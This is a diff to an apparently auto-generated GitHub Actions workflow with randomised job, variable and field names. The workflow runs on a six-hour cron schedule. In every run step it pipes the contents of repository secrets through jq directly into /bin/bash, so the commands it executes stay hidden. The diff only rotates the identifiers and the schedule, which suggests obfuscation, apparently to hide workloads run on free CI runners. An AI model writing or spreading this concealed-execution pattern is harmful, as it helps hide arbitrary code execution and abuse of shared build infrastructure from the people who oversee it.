@@ -2,22 +2,18 @@ name: maleiteng7813
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '21 2/6 * * *'
 
-jobs:  # 7486
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: maleiteng7813
         env:
-          gycs0: ${{ secrets.gycs0 }}
+          zmcni12631: ${{ secrets.zmcni12631 }}
         run: |
-          echo $gycs0 | jq -r .jwcbm2633 | /bin/bash
-          echo $nqlnf51643 | jq -r .tyatf68579 | /bin/bash
-          echo $ucj9629 | jq -r .gesp74 | /bin/bash
-          echo $l000 | jq -r .zcb5555 | /bin/bash
-          echo $czy62290 | jq -r .li429 | /bin/bash
-          echo $mjd155 | jq -r .dzf3047 | /bin/bash
-          echo $un04 | jq -r .xhzay0 | /bin/bash
+          echo $zmcni12631 | jq -r .ncu572 | /bin/bash
+          echo $advmc723 | jq -r .uulva444 | /bin/bash
+          echo $rz22346 | jq -r .xqr20 | /bin/bash
 
